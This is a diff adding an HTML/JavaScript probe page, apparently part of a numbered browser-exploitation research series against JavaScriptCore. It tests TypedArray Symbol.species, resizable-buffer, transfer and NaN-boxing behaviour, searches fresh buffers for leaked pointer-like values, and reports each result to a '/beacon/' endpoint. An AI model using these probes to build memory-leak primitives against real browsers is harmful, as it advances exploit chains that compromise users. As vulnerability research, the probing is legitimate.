@@ -1,0 +1,357 @@
+<!--
+  p767: TypedArray species / subclass confusion oracle
+
+  TypedArray subclassing and Symbol.species allow user code to
+  intercept TypedArray construction during slice/map/filter/subarray.
+  If the engine creates an internal TypedArray (e.g., during sort
+  comparator or map callback) and uses the species constructor,
+  a Proxy or custom constructor can observe the internal buffer
+  allocation -- including its size and backing store address range.
+
+  Key insight: TypedArray.prototype.sort() calls a user comparator
+  while holding a reference to the internal buffer. If the comparator
+  triggers GC or resizes a ResizableArrayBuffer, the engine must
+  handle the dangling reference. On 605.1.15-era JSC, the interaction
+  between sort's internal temporaries and species/resize may expose
+  stale data or allocation metadata.
+
+  BigUint64Array (confirmed available p605) gives 64-bit reads,
+  which is ideal for detecting pointer-sized values in any residue.
+
+  Attack angles:
+  A) TypedArray sort with species constructor interception.
+  B) TypedArray slice/map with Proxy species returning wrong size.
+  C) BigUint64Array as 64-bit reader on transferred/resized backing.
+  D) Float64Array NaN-boxing as pointer oracle.
+  E) SharedArrayBuffer absence workaround via transfer-and-read.
+  F) TypedArray subarray offset manipulation.
+
+  CRASH_CLASS: LOW (TypedArray operations, no side effects)
+  prior art: p605 (BigUint64Array confirmed), p601 (RAB confirmed),
+  p661 (Reflect.set TOCTOU -- bounds checked)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p767</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(hi,lo){
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+
+window.onload=function(){
+b('p767-START');
+
+// === Section A: Sort with species constructor ===
+try{
+  b('A-sort-species');
+  var speciesCalled=0;
+  var speciesSizes=[];
+
+  class TrackedArray extends Uint32Array {
+    static get [Symbol.species](){
+      return function(len){
+        speciesCalled++;
+        speciesSizes.push(len);
+        return new Uint32Array(len);
+      };
+    }
+  }
+
+  var ta=new TrackedArray(100);
+  for(var i=0;i<100;i++)ta[i]=100-i;
+
+  speciesCalled=0;
+  speciesSizes=[];
+  try{
+    var sorted=ta.sort();
+    b('A sort_species_calls='+speciesCalled+' sizes=['+speciesSizes.join(',')+']');
+    b('A sort_result_len='+sorted.length+' first='+sorted[0]+' last='+sorted[sorted.length-1]);
+  }catch(e){
+    b('A sort_species_calls='+speciesCalled+' err='+e.message);
+  }
+
+  speciesCalled=0;
+  speciesSizes=[];
+  try{
+    var sliced=ta.slice(0,50);
+    b('A slice_species_calls='+speciesCalled+' sizes=['+speciesSizes.join(',')+']');
+    b('A slice_result_len='+sliced.length);
+  }catch(e){
+    b('A slice_err='+e.message);
+  }
+
+  speciesCalled=0;
+  speciesSizes=[];
+  try{
+    var mapped=ta.map(function(v){return v*2;});
+    b('A map_species_calls='+speciesCalled+' sizes=['+speciesSizes.join(',')+']');
+  }catch(e){
+    b('A map_err='+e.message);
+  }
+
+  speciesCalled=0;
+  speciesSizes=[];
+  try{
+    var filtered=ta.filter(function(v){return v>50;});
+    b('A filter_species_calls='+speciesCalled+' sizes=['+speciesSizes.join(',')+']');
+    b('A filter_result_len='+filtered.length);
+  }catch(e){
+    b('A filter_err='+e.message);
+  }
+  b('A-DONE');
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: Species returning wrong size ===
+try{
+  b('B-wrong-size');
+  class ShortArray extends Float64Array {
+    static get [Symbol.species](){
+      return function(len){
+        return new Float64Array(Math.max(1,len-10));
+      };
+    }
+  }
+
+  var sa=new ShortArray(20);
+  for(var i=0;i<20;i++)sa[i]=i+0.5;
+
+  try{
+    var sliced=sa.slice(0,20);
+    b('B short_slice_len='+sliced.length+' expected=20');
+    if(sliced.length>10){
+      for(var i=10;i<sliced.length;i++){
+        if(sliced[i]!==0 && sliced[i]!==sliced[i]){
+          b('B short_slice['+i+']='+sliced[i]+' (unexpected)');
+        }
+      }
+    }
+  }catch(e){
+    b('B short_slice_err='+e.message);
+  }
+
+  class LongArray extends Float64Array {
+    static get [Symbol.species](){
+      return function(len){
+        return new Float64Array(len+100);
+      };
+    }
+  }
+
+  var la=new LongArray(20);
+  for(var i=0;i<20;i++)la[i]=i+0.5;
+
+  try{
+    var sliced=la.slice(0,20);
+    b('B long_slice_len='+sliced.length);
+    var extraNonZero=0;
+    for(var i=20;i<sliced.length;i++){
+      if(sliced[i]!==0){
+        extraNonZero++;
+        if(extraNonZero<=3){
+          var buf=new ArrayBuffer(8);
+          var f64=new Float64Array(buf);
+          var u32=new Uint32Array(buf);
+          f64[0]=sliced[i];
+          b('B extra['+i+']='+hex64(u32[1],u32[0])+' (float='+sliced[i]+')');
+        }
+      }
+    }
+    b('B long_extra_nonzero='+extraNonZero);
+  }catch(e){
+    b('B long_slice_err='+e.message);
+  }
+  b('B-DONE');
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: BigUint64Array as 64-bit reader ===
+try{
+  b('C-biguint64');
+  if(typeof BigUint64Array!=='undefined'){
+    var ab=new ArrayBuffer(1024);
+    var big=new BigUint64Array(ab);
+    var u8=new Uint8Array(ab);
+
+    for(var i=0;i<1024;i++)u8[i]=0;
+    var clone=structuredClone(ab,{transfer:[ab]});
+
+    var ab2=new ArrayBuffer(1024);
+    var big2=new BigUint64Array(ab2);
+    var nonzero=0;
+    var ptrs=[];
+    for(var i=0;i<big2.length;i++){
+      if(big2[i]!==0n){
+        nonzero++;
+        var val=big2[i];
+        var hi=Number(val>>32n);
+        var lo=Number(val&0xFFFFFFFFn);
+        if(hi>0x100 && hi<0x80000000){
+          ptrs.push({idx:i,val:hex64(hi,lo)});
+        }
+      }
+    }
+    b('C nonzero='+nonzero+' ptrs='+ptrs.length);
+    for(var i=0;i<Math.min(5,ptrs.length);i++){
+      b('C PTR idx='+ptrs[i].idx+' val='+ptrs[i].val);
+    }
+
+    var rabTest;
+    try{
+      rabTest=new ArrayBuffer(512,{maxByteLength:2048});
+      var rabBig=new BigUint64Array(rabTest);
+      for(var i=0;i<rabBig.length;i++)rabBig[i]=0xDEADn;
+      rabTest.resize(256);
+      var ab3=new ArrayBuffer(256);
+      var big3=new BigUint64Array(ab3);
+      var rabNz=0;
+      for(var i=0;i<big3.length;i++){
+        if(big3[i]!==0n)rabNz++;
+      }
+      b('C rab_resize_nonzero='+rabNz);
+    }catch(e){
+      b('C rab_err='+e.message);
+    }
+  }else{
+    b('C-SKIP no BigUint64Array');
+  }
+  b('C-DONE');
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: Float64Array NaN-boxing oracle ===
+try{
+  b('D-nanbox');
+  var buf=new ArrayBuffer(8);
+  var f64=new Float64Array(buf);
+  var u32=new Uint32Array(buf);
+
+  var testVals=[
+    NaN, Infinity, -Infinity, -0,
+    Number.MIN_VALUE, Number.MAX_VALUE,
+    Number.EPSILON, Number.MIN_SAFE_INTEGER,
+    Number.MAX_SAFE_INTEGER
+  ];
+  var names=[
+    'NaN','Inf','-Inf','-0',
+    'MIN_VAL','MAX_VAL',
+    'EPSILON','MIN_SAFE','MAX_SAFE'
+  ];
+
+  for(var i=0;i<testVals.length;i++){
+    f64[0]=testVals[i];
+    b('D '+names[i]+'='+hex64(u32[1],u32[0]));
+  }
+
+  f64[0]=NaN;
+  var canonHi=u32[1],canonLo=u32[0];
+  b('D canonical_nan='+hex64(canonHi,canonLo));
+
+  var signalNaNs=[
+    [0x7FF00001,0x00000000],
+    [0x7FF80000,0x00000001],
+    [0xFFF00001,0x00000000],
+    [0x7FF00000,0x00000001],
+  ];
+  for(var i=0;i<signalNaNs.length;i++){
+    u32[1]=signalNaNs[i][0];
+    u32[0]=signalNaNs[i][1];
+    var readBack=f64[0];
+    var buf2=new ArrayBuffer(8);
+    var f2=new Float64Array(buf2);
+    var u2=new Uint32Array(buf2);
+    f2[0]=readBack;
+    var preserved=(u2[1]===signalNaNs[i][0] && u2[0]===signalNaNs[i][1]);
+    b('D snan_'+hex64(signalNaNs[i][0],signalNaNs[i][1])+'_preserved='+preserved);
+  }
+  b('D-DONE');
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: Transfer-and-read pattern ===
+try{
+  b('E-transfer-read');
+  var eHits=0;
+  if(typeof BigUint64Array!=='undefined'){
+    for(var trial=0;trial<100;trial++){
+      var ab=new ArrayBuffer(192);
+      var u8=new Uint8Array(ab);
+      for(var i=0;i<192;i++)u8[i]=0;
+      var clone=structuredClone(ab,{transfer:[ab]});
+      for(var j=0;j<10;j++){
+        var dom=document.createElement('div');
+        dom.style.cssText='width:100px;height:100px;background:red;';
+        document.body.appendChild(dom);
+        document.body.removeChild(dom);
+      }
+      var ab2=new ArrayBuffer(192);
+      var big2=new BigUint64Array(ab2);
+      for(var i=0;i<big2.length;i++){
+        if(big2[i]!==0n){
+          var val=big2[i];
+          var hi=Number(val>>32n);
+          if(hi>0x100 && hi<0x80000000){
+            eHits++;
+            if(eHits<=5){
+              var lo=Number(val&0xFFFFFFFFn);
+              b('E-PTR trial='+trial+' idx='+i+' val='+hex64(hi,lo));
+            }
+          }
+        }
+      }
+    }
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: Subarray offset manipulation ===
+try{
+  b('F-subarray');
+  var base=new Float64Array(100);
+  for(var i=0;i<100;i++)base[i]=i+0.1;
+
+  var sub=base.subarray(10,20);
+  b('F sub_len='+sub.length+' buf_same='+(sub.buffer===base.buffer));
+  b('F sub_offset='+sub.byteOffset+' expected='+(10*8));
+
+  base[10]=Math.PI;
+  b('F shared_write='+(sub[0]===Math.PI));
+
+  var sub2=sub.subarray(2,8);
+  b('F sub2_offset='+sub2.byteOffset+' expected='+((10+2)*8));
+  b('F sub2_buf_same='+(sub2.buffer===base.buffer));
+
+  var buf=new ArrayBuffer(8);
+  var f64v=new Float64Array(buf);
+  var u32v=new Uint32Array(buf);
+
+  for(var i=0;i<sub.length;i++){
+    f64v[0]=sub[i];
+    var hi=u32v[1];
+    if((hi>>>20)===0x7FF || (hi>>>20)===0xFFF){
+      b('F nan_at_sub['+i+']='+hex64(u32v[1],u32v[0]));
+    }
+  }
+
+  class OffsetArray extends Float64Array {
+    static get [Symbol.species](){
+      return function(len){
+        var big=new Float64Array(len+20);
+        return big.subarray(0,len);
+      };
+    }
+  }
+
+  var oa=new OffsetArray(10);
+  for(var i=0;i<10;i++)oa[i]=i;
+  try{
+    var sliced=oa.slice(0,10);
+    b('F species_subarray_len='+sliced.length+' offset='+sliced.byteOffset);
+  }catch(e){
+    b('F species_subarray_err='+e.message);
+  }
+  b('F-DONE');
+}catch(e){b('F-ERR '+e.message);}
+
+setTimeout(function(){b('p767-COMPLETE');},500);
+};
+</script>
+</head>
+<body></body></html>
